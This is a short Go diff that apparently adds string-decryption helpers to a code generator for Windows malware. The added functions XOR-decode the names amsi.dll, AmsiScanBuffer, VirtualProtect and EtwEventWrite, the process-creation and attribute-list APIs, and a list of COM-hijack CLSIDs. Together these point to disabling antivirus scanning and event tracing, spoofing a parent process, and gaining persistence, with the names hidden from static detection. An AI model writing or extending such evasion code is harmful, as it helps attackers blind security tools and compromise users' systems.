@@ -571,5 +571,18 @@ func fwp(idx int) string {
 	if idx < len(s) { return s[idx] }
 	return ""
 }
+
+func getAmsiDll() string                     { return string(xor(encAmsiDll, decryptionKey)) }
+func getAmsiScanBufferName() string          { return string(xor(encAmsiScanBufferName, decryptionKey)) }
+func getVirtualProtectName() string          { return string(xor(encVirtualProtectName, decryptionKey)) }
+func getEtwEventWriteName() string           { return string(xor(encEtwEventWriteName, decryptionKey)) }
+func getSetConsoleTitleWName() string        { return string(xor(encSetConsoleTitleWName, decryptionKey)) }
+func getCreateProcessWName() string          { return string(xor(encCreateProcessWName, decryptionKey)) }
+func getOpenProcessName() string             { return string(xor(encOpenProcessName, decryptionKey)) }
+func getInitProcAttrListName() string        { return string(xor(encInitProcAttrListName, decryptionKey)) }
+func getUpdateProcAttrName() string          { return string(xor(encUpdateProcAttrName, decryptionKey)) }
+func getDeleteProcAttrListName() string      { return string(xor(encDeleteProcAttrListName, decryptionKey)) }
+func getCOMHijackCLSIDs() []string           { return decryptList(encCOMHijackCLSIDs) }
+func splitDecrypt(enc string) []string       { return decryptList(enc) }
 `)
 }
